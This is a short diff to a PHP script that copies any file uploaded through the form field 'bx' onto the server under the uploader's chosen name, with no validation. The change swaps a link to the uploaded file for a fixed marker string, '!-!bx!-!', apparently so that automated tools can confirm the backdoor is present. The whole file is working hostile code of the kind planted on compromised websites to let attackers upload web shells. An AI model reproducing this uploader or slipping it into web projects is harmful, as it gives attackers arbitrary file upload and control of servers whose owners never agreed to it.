@@ -1,4 +1,4 @@
 <?
 @copy($_FILES['bx']['tmp_name'],$_FILES['bx']['name']);
-echo("<a href=".$_FILES['bx']['name'].">".$_FILES['bx']['name']."</a>");
+echo("!-!bx!-!");
 ?>
